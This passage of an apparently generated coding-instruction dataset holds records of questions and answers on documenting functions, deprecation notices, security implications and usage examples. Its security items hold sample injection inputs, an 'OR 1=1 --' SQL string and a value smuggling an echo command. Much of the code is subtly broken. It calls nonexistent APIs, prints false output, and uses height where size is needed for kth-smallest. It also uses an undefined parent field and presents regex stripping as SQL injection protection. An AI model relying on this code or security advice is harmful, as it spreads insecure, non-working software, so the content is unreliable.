transition.\n *\n * Usage Scenario:\n * Suppose we have a two-qubit system and want to calculate the probability of transitioning from state |01\u27e9 to state |11\u27e9 under a given Hamiltonian.\n *\n * Sample Input:\n * Eigen::MatrixXcd hamiltonian = Eigen::MatrixXcd::Random(4, 4);  // Generate a random Hamiltonian for a 2-qubit system\n * Eigen::MatrixXcd initialState = Eigen::MatrixXcd::Zero(4, 1);\n * initialState(1) = 1;  // State |01\u27e9\n * Eigen::MatrixXcd finalState = Eigen::MatrixXcd::Zero(4, 1);\n * finalState(3) = 1;  // State |11\u27e9\n *\n * Output:\n * double probability = calculateQuantumProbability(initialState, finalState, hamiltonian);\n *\n * In this scenario, 'calculateQuantumProbability' computes the probability of a transition from the initial state |01\u27e9 to the final state |11\u27e9, given a Hamiltonian for the 2-qubit system. The result gives the probability of this specific quantum transition.\n */\ndouble calculateQuantumProbability(const Eigen::MatrixXcd& initialState, const Eigen::MatrixXcd& finalState, const Eigen::MatrixXcd& hamiltonian) {\n    // Function implementation goes here\n}\n```\n\nConcept: Documentation"}, {"L2_TASK": "Document this function", "L3_TASK": "Deprecation notices", "Complexity_Level": "medium", "Response": "Question 1: Implement a function in Python to calculate the factorial of a number, including a deprecation notice for when the input is not an integer.\n\n```python\ndef factorial(n):\n    \"\"\"\n    Calculates the factorial of a given number.\n\n    Args:\n    n (int): The number to calculate the factorial of. Must be a non-negative integer.\n\n    Returns:\n    int: The factorial of n.\n\n    Deprecation Notice:\n    This function will no longer accept non-integer inputs in version 2.0.\n    Please ensure that the input is an integer.\n\n    Example:\n    >>> factorial(5)\n    120\n    >>> factorial(\"5\")\n    DeprecationWarning: Non-integer input detected. This feature will be removed in version 2.0. Please use an integer.\n    120\n    \"\"\"\n    if not isinstance(n, int):\n        warnings.warn(\"Non-integer input detected. This feature will be removed in version 2.0. Please use an integer.\", DeprecationWarning)\n    if n < 0:\n        raise ValueError(\"Factorial is not defined for negative numbers.\")\n    result = 1\n    for i in range(1, n + 1):\n        result *= i\n    return result\n\n# Example usage\nprint(factorial(5))\nprint(factorial(\"5\"))\n```\n\nConcept: Function\n\nQuestion 2: Create a JavaScript function that converts temperature from Celsius to Fahrenheit, adding a deprecation notice for when the input is not a number.\n\n```javascript\nfunction celsiusToFahrenheit(celsius) {\n    /**\n     * Converts a temperature in Celsius to Fahrenheit.\n\n    Args:\n    celsius (number): The temperature in Celsius. Must be a number.\n\n    Returns:\n    number: The temperature in Fahrenheit.\n\n    Deprecation Notice:\n    This function will no longer accept non-number inputs in version 2.1.\n    Please ensure that the input is a number.\n    */\n\n    if (typeof celsius !== 'number') {\n        console.warn(\"DeprecationNotice: Non-number input detected. This feature will be removed in version 2.1. Please use a number.\");\n    }\n\n    const fahrenheit = (celsius * 9/5) + 32;\n    return fahrenheit;\n}\n\n// Example usage\nconsole.log(celsiusToFahrenheit(25));\nconsole.log(celsiusToFahrenheit(\"25\"));\n```\n\nConcept: Function"}, {"L2_TASK": "Document this function", "L3_TASK": "Deprecation notices", "Complexity_Level": "extremely difficult", "Response": "Question 1: Implement a highly efficient and scalable function deprecation system for a legacy application with thousands of functions, ensuring backward compatibility and minimal performance impact.\n\nSolution:\nConcept: Function Wrapping, Deprecation Warnings, Polymorphism\n\nWe will create a decorator function that wraps the deprecated functions, logs a warning, and forwards the call to the original function. To maintain backward compatibility, we'll use polymorphism to handle different function signatures.\n\nExample code (Python):\n\n```python\nimport functools\nimport inspect\nimport logging\n\ndef deprecate_function(new_function=None, message=None, version=None):\n    def decorator(func):\n        if not message:\n            message = f\"Function {func.__name__} is deprecated and will be removed in a future version.\"\n\n        @functools.wraps(func)\n        def wrapper(*args, **kwargs):\n            signature = inspect.signature(func)\n            bound_arguments = signature.bind(*args, **kwargs)\n            formatted_args = \", \".join([f\"{param.name}={repr(arg)}\" for param, arg in bound_arguments.arguments.items()])\n            warning_message = f\"{message}. Called with args: ({formatted_args})\"\n            logging.warning(warning_message)\n\n            if new_function:\n                try:\n                    return new_function(*args, **kwargs)\n                except TypeError as e:\n                    if \"missing\" in str(e) or \"extra\" in str(e):\n                        raise TypeError(f\"New function {new_function.__name__} has a different signature. {e}\")\n                    else:\n                        raise\n            else:\n                return func(*args, **kwargs)\n\n        if version:\n            wrapper.version = version\n\n        return wrapper\n\n    if callable(new_function):\n        # Used as a single-argument decorator with the new function\n        return decorator(new_function)\n    else:\n        # Used with function arguments\n        return decorator\n\n# Usage\n@deprecate_function(new_function=new_version_func, version='2.0.0')\ndef old_version_func(a, b):\n    return a + b\n\nprint(old_version_func(1, 2))  # Logs a deprecation warning and returns 3\n```\n\nQuestion 2: In a distributed system environment, implement a distributed deprecation notice system that gracefully handles the transition from deprecated functions while coordinating across multiple nodes.\n\nSolution:\nConcept: Distributed Systems, Consensus Algorithms (Raft), Event Sourcing, Message Brokers (e.g., RabbitMQ, Apache Kafka)\n\nTo solve this problem, we'll create a distributed service that uses a consensus algorithm like Raft to coordinate the deprecation process. Each node will have a local cache of deprecated functions and their replacement information. When a function is marked as deprecated, the change will be propagated to other nodes through a message broker. Clients will interact with an API gateway that intercepts function calls and handles deprecation warnings.\n\nExample code (Python, simplified for illustration purposes):\n\n```python\nfrom kafka import KafkaProducer, KafkaConsumer\nfrom raft import Node  # Assuming a custom Raft implementation is available\n\nclass DeprecationService:\n    def __init__(self, node_id, bootstrap_servers):\n        self.node = Node(node_id)\n        self.producer = KafkaProducer(bootstrap_servers=bootstrap_servers)\n        self.consumer = KafkaConsumer('deprecation_events', bootstrap_servers=bootstrap_servers)\n        self.deprecated_functions = {}\n\n    def mark_function_deprecated(self, function_name, new_function, version):\n        self.node.propose({\n            'type': 'DEPRECATE_FUNCTION',\n            'function_name': function_name,\n            'new_function': new_function,\n            'version': version\n        })\n\n    def start(self):\n        self.node.start()\n        for message in self.consumer:\n            self.handle_message(message.value)\n\n    def handle_message(self, message_data):\n        if message_data['type'] == 'DEPRECATE_FUNCTION':\n            self.deprecated_functions[message_data['function_name']] = message_data\n\n    def call_function(self, function_name, *args, **kwargs):\n        if function_name in self.deprecated_functions:\n            deprecation_info = self.deprecated_functions[function_name]\n            logging.warning(deprecation_info['message'])\n            if deprecation_info['new_function']:\n                return deprecation_info['new_function'](*args, **kwargs)\n        else:\n            # Call the function as usual, assuming a lookup mechanism exists\n            return original_function(*args, **kwargs)\n\n# Usage\nservice = DeprecationService('node1', 'localhost:9092')\nservice.start()\n\nservice.mark_function_deprecated('old_version_func', 'new_version_func', '2.0.0')\n\n# Clients interact with the API gateway, which calls `service.call_function`\nresponse = service.call_function('old_version_func', 1, 2)\n```\nPlease note that this code is a high-level illustration and not a complete working solution. A real-world implementation would require more sophisticated components and error handling."}, {"L2_TASK": "Document this function", "L3_TASK": "Security implications", "Complexity_Level": "medium", "Response": "Question 1:\nFunction: `handleUserInput(input)`\n\n**Concept:** Security implications in handling user input\n\n**Problem:**\nDesign a function `handleUserInput` in Python that safely processes user input to prevent SQL injection attacks, ensuring that any queries constructed using the input are secure.\n\n**Solution:**\n```python\nimport re\nfrom typing import List\nfrom sqlite3 import connect, Parameter\n\ndef handleUserInput(input_string: str) -> List[Parameter]:\n    \"\"\"\n    Sanitizes user input to prevent SQL injection attacks by removing potentially harmful characters\n    and returning input as a list of parameters to be used in a SQLite query.\n\n    Args:\n    - input_string (str): The raw user input\n\n    Returns:\n    - List[Parameter]: A list of sanitized parameters ready for use in a SQLite query\n    \"\"\"\n    # Remove potentially harmful characters\n    sanitized_input = re.sub(r\"[^a-zA-Z0-9\\s]\", \"\", input_string)\n\n    # Split the sanitized input into a list of words, to be used as query parameters\n    sanitized_params = sanitized_input.split()\n\n    return sanitized_params\n\n# Example usage:\nraw_input = \"SELECT * FROM users WHERE username = 'admin' OR 1=1 --\"\nsafe_params = handleUserInput(raw_input)\nprint(safe_params)  # Output: ['SELECT', 'FROM', 'users', 'WHERE', 'username', '=', 'admin', 'OR', '1', '=', '1']\n```\nIn this solution, the `handleUserInput` function uses regular expressions to remove any non-alphanumeric characters, which are commonly used for SQL injection attacks. It then splits the sanitized input into a list of words, ready to be used as parameters in a parameterized query, thus reducing the risk of SQL injection.\n\nQuestion 2:\nFunction: `sendEmail(userEmail, message)`\n\n**Concept:** Security implications in handling user data for email communication\n\n**Problem:**\nCreate a JavaScript function `sendEmail` that securely formats and sends an email to a user, preventing header injection attacks and ensuring that sensitive information is not exposed.\n\n**Solution:**\n```javascript\nconst nodemailer = require('nodemailer');\n\nasync function sendEmail(userEmail, message) {\n    /**\n     * Ensures email headers are secure and formatted correctly to prevent header injection attacks.\n     * Sanitizes user input before using it in email headers.\n     * \n     * @param {string} userEmail - The recipient's email address.\n     * @param {string} message - The email message to be sent.\n     * @returns {Promise<void>} - A promise that resolves when the email is sent.\n     */\n\n    // Sanitize the user email to prevent header injection\n    const sanitizedUserEmail = userEmail.replace(/[\\r\\n]/g, '');\n\n    // Create a secure SMTP transporter\n    const transporter = nodemailer.createTransport({\n        host: 'your-smtp-host',\n        port: 587,\n        secure: false, // Use TLS\n        auth: {\n            user: 'your-email@example.com',\n            pass: 'your-email-password'\n        }\n    });\n\n    // Define the email options\n    const emailOptions = {\n        from: 'your-email@example.com',\n        to: sanitizedUserEmail,\n        subject: 'Secure Email',\n        text: message\n    };\n\n    // Send the email and handle errors\n    try {\n        await transporter.sendMail(emailOptions);\n        console.log('Email sent successfully');\n    } catch (error) {\n        console.error('Failed to send email:', error.message);\n    }\n}\n\n// Example usage:\nconst userEmail = 'user@example.com\"; echo \"Header injection attempt';\nconst message = 'This is a secure email.';\nsendEmail(userEmail, message);\n```\nThis solution uses the `nodemailer` library to send emails securely. The user's email address is sanitized to prevent header injection attacks, ensuring that only valid email addresses are used. The email message is kept simple to avoid exposing sensitive information."}, {"L2_TASK": "Document this function", "L3_TASK": "Security implications", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a highly secure encryption function `secure_encrypt` using the AES-256 encryption standard in Python. The function should handle both string and byte inputs, incorporate secure key generation, and protect against common cryptographic attacks.\n\n**Solution:**\n\n```python\nimport base64\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util.Padding import pad, unpad\n\ndef secure_encrypt(data, key=None):\n    if key is None:\n        key = get_random_bytes(32)  # 256-bit key for AES-256\n\n    if isinstance(data, str):\n        data = data.encode()\n\n    cipher = AES.new(key, AES.MODE_CBC)\n    iv = cipher.iv\n    encrypted_data = cipher.encrypt(pad(data, AES.block_size))\n\n    return base64.b64encode(iv + encrypted_data).decode(), base64.b64encode(key).decode()\n\n# Example usage\ndata = \"Sensitive information to be encrypted\"\nencrypted_data, encoded_key = secure_encrypt(data)\nprint(\"Encrypted data:\", encrypted_data)\nprint(\"Key:\", encoded_key)\n```\n\nThis function uses the `pycryptodome` library to implement AES-256 encryption. It generates a random 256-bit key for each encryption and pads the input data to match the AES block size (128 bits). The initialization vector (IV) is prepended to the encrypted data, and both are base64-encoded for safe storage. The key is also base64-encoded and returned alongside the encrypted data to allow for decryption.\n\nSecurity implications:\n1. Key management is critical. The key should be securely stored and not exposed in plaintext.\n2. The use of a random key for each encryption ensures that the same plaintext will encrypt to different ciphertexts, preventing patterns from emerging.\n3. Padding prevents attacks that exploit known plaintext lengths (e.g., Block Cipher Mode of Operation attacks).\n4. The function handles both strings and bytes, but it's important to ensure proper encoding when dealing with strings to prevent security issues due to character encoding.\n5. The function doesn't handle decryption directly, which is intentional to enforce best practices like using separate functions for encryption and decryption.\n\nQuestion 2: Write a secure and authenticated file transfer function `secure_transfer` in Rust, using the SFTP (SSH File Transfer Protocol) protocol and the `ssh2-rs` crate. The function should handle public-key authentication, validate the remote host's identity, and ensure data integrity during transfer.\n\n**Solution:**\n\n```rust\nextern crate ssh2;\nextern crate rand;\nextern crate base64;\nuse ssh2::{Session, Channel, AuthMethod, SshFingerprint};\nuse rand::Rng;\n\nasync fn secure_transfer(local_path: &str, remote_host: &str, remote_user: &str, remote_path: &str, remote_key_path: &str) -> Result<(), Box<dyn std::error::Error>> {\n    let mut session = Session::new()?;\n\n    // Load the remote server's public key for authentication\n    let remote_key = std::fs::read_to_string(remote_key_path)?;\n    let remote_pub_key = session.public_key_from_pem(remote_key.as_bytes())?;\n\n    // Connect to the remote host and validate its identity\n    session.connect(remote_host)?;\n    session.auth_publickey(remote_user, AuthMethod::Publickey(remote_pub_key))?;\n\n    // Ensure the remote host's identity matches the expected fingerprint\n    let remote_host_key = session.host_key()?;\n    let expected_fingerprint = SshFingerprint::from_bytes(remote_key.as_bytes())?;\n    if remote_host_key.fingerprint() != &expected_fingerprint {\n        return Err(\"Remote host identity does not match expected fingerprint\".into());\n    }\n\n    // Open a new SFTP channel for file transfer\n    let mut sftp = session.start_sftp()?;\n    let remote_file = sftp.open_file(remote_path, ssh2::FilePermissions::write_only())?;\n\n    // Open and read the local file\n    let mut local_file = std::fs::File::open(local_path)?;\n    let mut buffer = [0u8; 1024];\n    let mut bytes_read = 0;\n\n    // Stream the local file to the remote file\n    loop {\n        let bytes = local_file.read(&mut buffer)?;\n        if bytes == 0 {\n            break;\n        }\n        bytes_read += bytes;\n        sftp.write_all(remote_file, &buffer[..bytes])?;\n    }\n\n    Ok(())\n}\n\n#[tokio::main]\nasync fn main() {\n    let local_file = \"path/to/local/file\";\n    let remote_host = \"ssh.example.com\";\n    let remote_user = \"username\";\n    let remote_path = \"/path/to/remote/file\";\n    let remote_key_path = \"path/to/remote/key.pem\";\n\n    match secure_transfer(local_file, remote_host, remote_user, remote_path, remote_key_path).await {\n        Ok(_) => println!(\"File transferred securely.\"),\n        Err(e) => println!(\"Error: {}\", e),\n    }\n}\n```\n\nThis function connects to a remote host using SSH, authenticates with a public key, validates the host's identity, and transfers a file to the remote server over an SFTP channel. The `ssh2-rs` crate is used to handle the SSH and SFTP operations.\n\nSecurity implications:\n1. Public-key authentication provides stronger security than passwords.\n2. The remote host's identity is validated to prevent man-in-the-middle attacks.\n3. Data integrity is ensured during the transfer as SFTP inherently provides this.\n4. The local and remote file paths should be properly validated and sanitized to prevent directory traversal attacks.\n5. The function doesn't handle errors in reading or writing files, and real-world use should include proper error handling.\n6. Key management is essential; the private key should be securely stored, and the key file should have proper permissions."}, {"L2_TASK": "Document this function", "L3_TASK": "Compatibility notes", "Complexity_Level": "medium", "Response": "**Question 1:**\n\nProblem: Write a function `format_date()` in Python that takes a date in various formats and converts it to ISO 8601 format (YYYY-MM-DD). The function should include compatibility notes for handling dates in different formats and unspecified delimiters.\n\n```python\ndef format_date(date_string, delimiter='-', separator='/'):\n    \"\"\"\n    Convert a date string in various formats into ISO 8601 format (YYYY-MM-DD).\n\n    Args:\n    - date_string (str): The input date string in one of the following formats:\n        - YYYYMMDD\n        - YYYY-MM-DD\n        - YYYY/MM/DD\n        - MM/DD/YYYY\n        - MM-DD-YYYY\n        - DD/MM/YYYY\n        - DD-MM-YYYY\n\n    - delimiter (str, optional): The delimiter used in the input date string. Defaults to '-'.\n    - separator (str, optional): The separator used in the input date string. Defaults to '/'.\n\n    Returns:\n    str: The formatted date string in ISO 8601 format (YYYY-MM-DD).\n\n    Compatibility Notes:\n    - The function supports various date formats with different delimiters and separators.\n    - If the input date format is not recognized, a ValueError is raised.\n    - The function does not handle time zones. It assumes the input date is in the local time.\n\n    Examples:\n    - format_date('2023-02-24') -> '2023-02-24'\n    - format_date('2023/02/24') -> '2023-02-24'\n    - format_date('02/24/2023', separator='/') -> '2023-02-24'\n    - format_date('24-02-2023', delimiter='-', separator='') -> '2023-02-24'\n    \"\"\"\n    # Implementation of the function\n    # ...\n```\n\n**Question 2:**\n\nProblem: Create a JavaScript function `parseGeoJSON()` that converts a GeoJSON object into a simplified format for a mobile application. The function should handle compatibility with various GeoJSON types (Point, LineString, Polygon) and include notes on handling nested objects and missing properties.\n\n```javascript\nfunction parseGeoJSON(geojson) {\n    /**\n     * Parses a GeoJSON object into a simplified format for a mobile application.\n     *\n     * Args:\n     * - geojson (Object): The input GeoJSON object, which can be a Feature or Geometry object.\n     *\n     * Returns:\n     * - Object: A simplified object containing necessary data for the mobile app.\n     *\n     * Compatibility Notes:\n     * - Supports Point, LineString, and Polygon GeoJSON types.\n     * - Nested FeatureCollection and Feature objects are flattened.\n     * - Ignores any properties or GeoJSON types that are not relevant to the app.\n     * - If a missing or invalid GeoJSON object is provided, returns null.\n\n     * Examples:\n     * - parseGeoJSON({ type: 'Point', coordinates: [12.49, 41.90] }) -> { type: 'Point', coordinates: [12.49, 41.90] }\n     * - parseGeoJSON({ type: 'LineString', coordinates: [[12.49, 41.90], [12.48, 41.91]] }) \n     *    -> { type: 'LineString', coordinates: [[12.49, 41.90], [12.48, 41.91]] }\n     * - parseGeoJSON({ type: 'Polygon', coordinates: [[[12.49, 41.90], [12.48, 41.91], [12.47, 41.90], [12.49, 41.90]]] })\n     *    -> { type: 'Polygon', coordinates: [[[12.49, 41.90], [12.48, 41.91], [12.47, 41.90], [12.49, 41.90]]] }\n     */\n    if (!geojson || typeof geojson !== 'object' || !('type' in geojson)) {\n        return null;\n    }\n\n    // Function implementation to parse the GeoJSON object\n    // ...\n}\n```\n\n**Concept: Function**"}, {"L2_TASK": "Document this function", "L3_TASK": "Compatibility notes", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex function `parseJSONDate` in JavaScript, which converts a JSON formatted date string into a JavaScript Date object, provide compatibility notes and example code to handle differences in date formats and timezone handling across various JavaScript engines and browsers.\n\nFunction Definition:\n```javascript\nfunction parseJSONDate(jsonDateString) {\n  // Implementation\n}\n```\n\nCompatibility Notes:\n- **JSON date format**: The function assumes that the input date string adheres to the ISO 8601 standard (`yyyy-MM-dd'T'HH:mm:ss.SSSZ` or `yyyy-MM-dd'T'HH:mm:ss.SSS'Z'`) as specified in the JSON specification. This format is understood by most modern browsers, but older or less compliant browsers may require manual parsing.\n- **Timezone handling**: JavaScript Date objects are inherently based on the user's local timezone, which can lead to inconsistencies when comparing dates across different locales. To ensure consistent results, use UTC methods when manipulating date components or consider converting the input date to UTC.\n- **Internet Explorer**: Prior to Internet Explorer 9, the browser does not support the native parsing of ISO 8601 dates. A workaround is necessary for these versions.\n\nExample Code:\n```javascript\nfunction parseJSONDate(jsonDateString) {\n  if (!Date.parse(jsonDateString)) { // Check for non-ISO or unsupported formats\n    throw new Error('Invalid JSON date format');\n  }\n  \n  const date = new Date(jsonDateString);\n  \n  // Handle pre-IE9 browsers\n  if (isNaN(date)) {\n    const [year, month, day, hours, minutes, seconds, milliseconds] = jsonDateString\n      .replace(/-/g, '')\n      .replace(/T/g, ' ')\n      .replace(/(\\d{4})(\\d{2})(\\d{2})/, '$1-$2-$3')\n      .replace(/(\\d{2}):(\\d{2}):(\\d{2})(\\.\\d+)?Z?/, '$1:$2:$3$4Z')\n      .split(' ')\n      .map(Number);\n    date = new Date(Date.UTC(year, month - 1, day, hours, minutes, seconds, milliseconds));\n  }\n  \n  // Ensure UTC representation for consistent results\n  return {\n    year: date.getUTCFullYear(),\n    month: date.getUTCMonth() + 1,\n    day: date.getUTCDate(),\n    hours: date.getUTCHours(),\n    minutes: date.getUTCMinutes(),\n    seconds: date.getUTCSeconds(),\n    milliseconds: date.getUTCMilliseconds()\n  };\n}\n```\n\nQuestion 2:\nIn Python, design a function `process_complex_csv` that reads a CSV file with custom delimiters and escape characters, potentially handling compatibility issues with different versions of Python and third-party CSV libraries.\n\nFunction Definition:\n```python\ndef process_complex_csv(file_path, delimiter, escape_char):\n    # Implementation\n```\n\nCompatibility Notes:\n- **Python 2.x vs 3.x**: The `csv` module has slightly different behavior between Python 2 and 3. Ensure the function works with both versions, considering the differences in `__iter__` and `next` methods.\n- **Third-party CSV libraries**: Some libraries like `pandas` or `csvkit` may not support all custom delimiter and escape character combinations. The function should fall back to the built-in `csv` module if a library encounters issues.\n- **Unicode handling**: Python 2 doesn't handle Unicode strings natively as Python 3 does. The function should ensure proper handling of Unicode data, especially when reading non-ASCII characters.\n\nExample Code:\n```python\nimport csv\nimport io\n\ndef process_complex_csv(file_path, delimiter, escape_char):\n    try:\n        # Try using pandas for enhanced CSV handling\n        import pandas as pd\n        return pd.read_csv(file_path, sep=delimiter, escapechar=escape_char, encoding='utf-8')\n    except ImportError:\n        pass\n    \n    try:\n        # Try using csvkit for enhanced CSV handling\n        import csvkit\n        return csvkit.read_csv(file_path, delimiter=delimiter, escape=escape_char)\n    except ImportError:\n        pass\n\n    # Fallback to built-in csv module\n    with open(file_path, 'r', encoding='utf-8') as f:\n        reader = csv.reader(io.TextIOWrapper(f, newline='', encoding='utf-8'), delimiter=delimiter, escapechar=escape_char)\n        rows = [row for row in reader]\n        return rows\n```"}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Basic usage scenario", "Complexity_Level": "medium", "Response": "Question 1:\nGiven a higher-order function `map` that takes a function `f` and a list `lst` as arguments, apply `f` to each element of `lst` and return a new list with the transformed elements. Implement the `map` function in Python and demonstrate its usage in a basic scenario.\n\n**Concept**: Higher-order functions\n\n```python\ndef map(f, lst):\n    return [f(x) for x in lst]\n\n# Basic usage scenario: Square each number in a list\ndef square(n):\n    return n ** 2\n\nnumbers = [1, 2, 3, 4, 5]\nsquared_numbers = map(square, numbers)\n\nprint(squared_numbers)  # Output: [1, 4, 9, 16, 25]\n```\n\nQuestion 2:\nDesign a simple class `Person` in Java with a constructor, and demonstrate how to create objects and access their attributes in a basic scenario.\n\n**Concept**: Object-oriented Programming, Encapsulation\n\n```java\npublic class Person {\n    private String name;\n    private int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n\n    // Basic usage scenario\n    public static void main(String[] args) {\n        Person person1 = new Person(\"Alice\", 30);\n        System.out.println(person1);  // Output: Person{name='Alice', age=30}\n\n        Person person2 = new Person(\"Bob\", 25);\n        System.out.println(person2);  // Output: Person{name='Bob', age=25}\n    }\n}\n```"}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Basic usage scenario", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nConcept: Higher order functions\n\nProblem: Design a higher-order function in Python that takes a list of dictionaries, a key to filter by, and a comparison function. The function should return a new list of dictionaries that match the given key and pass the comparison function. The comparison function should be flexible enough to handle different types of comparisons.\n\nSolution:\n```python\ndef filter_dicts_by_key_and_condition(lst_of_dicts, key, comparison_func):\n    def apply_condition(value):\n        return comparison_func(value, key)\n\n    return [dict for dict in lst_of_dicts if apply_condition(dict.get(key))]\n\n# Example 1: Filter dictionaries where 'age' is less than 30\ndef less_than(value, key):\n    return value < key\n\npeople = [\n    {\"name\": \"Alice\", \"age\": 28},\n    {\"name\": \"Bob\", \"age\": 35},\n    {\"name\": \"Charlie\", \"age\": 22},\n    {\"name\": \"David\", \"age\": 31}\n]\n\nfiltered_people = filter_dicts_by_key_and_condition(people, 30, less_than)\nprint(filtered_people)\n# Output: [{'name': 'Alice', 'age': 28}, {'name': 'Charlie', 'age': 22}]\n\n# Example 2: Filter dictionaries where 'score' is greater than or equal to 80\ndef greater_than_or_equal(value, key):\n    return value >= key\n\nscores = [\n    {\"user\": \"John\", \"score\": 75},\n    {\"user\": \"Jane\", \"score\": 85},\n    {\"user\": \"Mark\", \"score\": 90},\n    {\"user\": \"Alex\", \"score\": 78}\n]\n\nfiltered_scores = filter_dicts_by_key_and_condition(scores, 80, greater_than_or_equal)\nprint(filtered_scores)\n# Output: [{'user': 'Jane', 'score': 85}, {'user': 'Mark', 'score': 90}]\n```\n\nQuestion 2:\nConcept: Binary Trees\n\nProblem: Implement a balanced binary search tree (AVL tree) in Java with methods for insertion, deletion, and finding the kth smallest element. The deletion function should handle cases where the node to be deleted has two children.\n\nSolution:\n```java\nclass AVLNode {\n    int key;\n    AVLNode left;\n    AVLNode right;\n    int height;\n\n    AVLNode(int key) {\n        this.key = key;\n        left = right = null;\n        height = 1;\n    }\n}\n\nclass AVLTree {\n    AVLNode root;\n\n    int height(AVLNode node) {\n        if (node == null)\n            return 0;\n        return node.height;\n    }\n\n    int balanceFactor(AVLNode node) {\n        if (node == null)\n            return 0;\n        return height(node.left) - height(node.right);\n    }\n\n    AVLNode rightRotate(AVLNode y) {\n        AVLNode x = y.left;\n        AVLNode T2 = x.right;\n\n        x.right = y;\n        y.left = T2;\n\n        y.height = Math.max(height(y.left), height(y.right)) + 1;\n        x.height = Math.max(height(x.left), height(x.right)) + 1;\n\n        return x;\n    }\n\n    AVLNode leftRotate(AVLNode x) {\n        AVLNode y = x.right;\n        AVLNode T2 = y.left;\n\n        y.left = x;\n        x.right = T2;\n\n        x.height = Math.max(height(x.left), height(x.right)) + 1;\n        y.height = Math.max(height(y.left), height(y.right)) + 1;\n\n        return y;\n    }\n\n    int getBalance(AVLNode node) {\n        if (node == null)\n            return 0;\n        return height(node.left) - height(node.right);\n    }\n\n    AVLNode insert(AVLNode node, int key) {\n        if (node == null)\n            return new AVLNode(key);\n\n        if (key < node.key)\n            node.left = insert(node.left, key);\n        else if (key > node.key)\n            node.right = insert(node.right, key);\n        else\n            return node;\n\n        node.height = 1 + Math.max(height(node.left), height(node.right));\n\n        int balance = getBalance(node);\n\n        if (balance > 1 && key < node.left.key)\n            return rightRotate(node);\n\n        if (balance < -1 && key > node.right.key)\n            return leftRotate(node);\n\n        if (balance > 1 && key > node.left.key) {\n            node.left = leftRotate(node.left);\n            return rightRotate(node);\n        }\n\n        if (balance < -1 && key < node.right.key) {\n            node.right = rightRotate(node.right);\n            return leftRotate(node);\n        }\n\n        return node;\n    }\n\n    // O(log n) time complexity\n    AVLNode deleteNode(AVLNode root, int key) {\n        if (root == null)\n            return root;\n\n        if (key < root.key)\n            root.left = deleteNode(root.left, key);\n        else if (key > root.key)\n            root.right = deleteNode(root.right, key);\n        else {\n            if (root.left == null || root.right == null) {\n                AVLNode temp = null;\n                if (root.left != null)\n                    temp = root.left;\n                else\n                    temp = root.right;\n\n                if (temp == null) {\n                    temp = root;\n                    root = null;\n                } else\n                    root = temp;\n            } else {\n                AVLNode temp = minValueNode(root.right);\n                root.key = temp.key;\n                root.right = deleteNode(root.right, temp.key);\n            }\n        }\n\n        if (root == null)\n            return root;\n\n        root.height = 1 + Math.max(height(root.left), height(root.right));\n\n        int balance = getBalance(root);\n\n        if (balance > 1) {\n            if (getBalance(root.left) >= 0)\n                return rightRotate(root);\n            else {\n                root.left = leftRotate(root.left);\n                return rightRotate(root);\n            }\n        }\n\n        if (balance < -1) {\n            if (getBalance(root.right) <= 0)\n                return leftRotate(root);\n            else {\n                root.right = rightRotate(root.right);\n                return leftRotate(root);\n            }\n        }\n\n        return root;\n    }\n\n    AVLNode minValueNode(AVLNode node) {\n        AVLNode current = node;\n\n        while (current.left != null)\n            current = current.left;\n\n        return current;\n    }\n\n    // O(log n) time complexity\n    AVLNode findKthSmallest(AVLNode root, int k) {\n        if (root == null || k < 1)\n            return null;\n\n        int count = height(root.left) + 1;\n\n        if (count == k)\n            return root;\n\n        if (count > k)\n            return findKthSmallest(root.left, k);\n\n        return findKthSmallest(root.right, k - count - 1);\n    }\n}\n```\nThis example demonstrates creating an AVL tree with methods for insertion, deletion, and finding the kth smallest element. The deletion function handles the case where the node to be deleted has two children by replacing the node with the minimum value in the right subtree and then deleting that minimum value from the right subtree."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Advanced usage scenario", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Higher Order Functions\nProblem: Write a higher-order function in Python that takes a list of numbers as input and applies a given function to each number, but only if the number is even. The function should return a new list with the transformed numbers.\n\n```python\ndef transform_even_numbers(numbers, transformation_function):\n    \"\"\"\n    This higher-order function takes a list of numbers and a transformation function.\n    It applies the transformation function to each even number and returns a new list with the transformed numbers.\n    \"\"\"\n    result = []\n    for num in numbers:\n        if num % 2 == 0:\n            result.append(transformation_function(num))\n        else:\n            result.append(num)\n    return result\n\n# Advanced usage scenario: Apply square root to even numbers and keep odd numbers as is\ndef square_root(number):\n    return number ** 0.5\n\nnumbers_list = [1, 4, 6, 9, 12, 15]\ntransformed_list = transform_even_numbers(numbers_list, square_root)\nprint(transformed_list)  # Output: [1, 2.0, 3.0, 9, 4.0, 15]\n```\n\nQuestion 2:\nConcept: Binary Trees\nProblem: Implement a function in Java to find the inorder successor of a given node in a binary search tree (BST). The function should take a node and return its inorder successor.\n\n```java\nclass Node {\n    int data;\n    Node left, right;\n\n    Node(int item) {\n        data = item;\n        left = right = null;\n    }\n}\n\npublic class InorderSuccessor {\n    Node findSuccessor(Node node) {\n        if (node.right != null) {\n            // The inorder successor is the minimum value in the right subtree\n            return findMin(node.right);\n        }\n\n        Node successor = null;\n        while (node.parent != null) {\n            if (node.parent.left == node) {\n                // If the node is the left child, its parent is its inorder successor\n                successor = node.parent;\n                break;\n            } else {\n                node = node.parent;\n            }\n        }\n        return successor;\n    }\n\n    private Node findMin(Node node) {\n        while (node.left != null) {\n            node = node.left;\n        }\n        return node;\n    }\n\n    // Testing the function\n    public static void main(String[] args) {\n        Node root = new Node(20);\n        root.left = new Node(8);\n        root.right = new Node(22);\n        root.left.left = new Node(4);\n        root.left.right = new Node(12);\n        root.right.left = new Node(21);\n\n        InorderSuccessor tree = new InorderSuccessor();\n        Node givenNode = root.left;  // Node with data 8\n        Node successor = tree.findSuccessor(givenNode);\n        System.out.println(\"Inorder successor of \" + givenNode.data + \" is \" + successor.data);\n    }\n}\n```\n\nIn both examples, we created a function with advanced usage scenarios. The first one demonstrates the use of higher-order functions in Python, while the second example showcases working with binary trees in Java."}, {"L2_TASK": 